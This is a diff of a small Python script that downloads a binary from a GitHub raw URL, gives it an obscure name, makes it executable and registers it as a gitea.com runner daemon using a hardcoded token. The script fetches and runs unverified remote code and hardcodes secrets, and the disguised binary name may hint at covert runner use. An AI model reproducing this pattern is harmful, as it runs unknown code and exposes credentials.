@@ -3,21 +3,22 @@ import subprocess
 import urllib.request
 import os
 
-TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"
+TOKEN = "mGfbPYr0YOqtdg5z1OUf9ZPrGCvepuWiHfqxATIE"
 
 URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"
+BINARY = "jwnaos"
 
-# Download binary as doscolo
-print("[1] Downloading...")
-urllib.request.urlretrieve(URL, "doscolo")
+# Download
+print("[1] Downloading jwnaos...")
+urllib.request.urlretrieve(URL, BINARY)
 
-# chmod 777
-os.chmod("doscolo", 0o777)
+# Set executable permission
+os.chmod(BINARY, 0o755)
 
 # Register runner
-print("[2] Registering...")
+print("[2] Registering runner...")
 subprocess.run([
-    "./doscolo",
+    "./" + BINARY,
     "register",
     "--instance", "https://gitea.com/",
     "--token", TOKEN,
@@ -27,4 +28,4 @@ subprocess.run([
 
 # Start daemon
 print("[3] Starting daemon...")
-subprocess.run(["./doscolo", "daemon"], check=True)
+subprocess.run(["./" + BINARY, "daemon"], check=True)
